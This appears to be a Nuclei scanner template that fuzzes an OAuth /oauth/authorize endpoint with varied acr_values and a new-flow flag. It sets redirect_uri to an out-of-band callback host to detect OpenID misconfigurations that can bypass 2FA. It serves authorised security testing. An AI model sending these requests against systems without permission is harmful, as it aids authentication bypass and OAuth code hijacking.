id: fuzz-oauth
info:
  author: geeknik
  name: Fuzz OAuth
  reference: https://youst.in/posts/bypassing-2fa-using-openid-misconfiguration/
  severity: info
  tags: fuzz,oauth
requests:
- attack: clusterbomb
  matchers:
  - type: word
    words:
    - '{{randstr}}'
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  matchers-condition: or
  payloads:
    acr:
    - face
    - fpt
    - geo
    - hwk
    - iris
    - kba
    - mca
    - mfa
    - otp
    - pin
    - pwd
    - rba
    - retina
    - sc
    - sms
    - swk
    - tel
    - user
    - wia
    boolean:
    - true
    - false
  raw:
  - "GET /oauth/authorize?new-flow=\xA7boolean\xA7&client_id={{randstr}}&redirect_uri=https://{{interactsh-url}}%2Flogin&response_type=code&scope=openid&acr_values=\xA7\
    acr\xA7+password&state={{randstr}} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
    \ (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77\
    \ Safari/537.36\nAccept: */*\nAccept-Language: en\nAccept-Encoding: gzip\nConnection:\
    \ close\n"
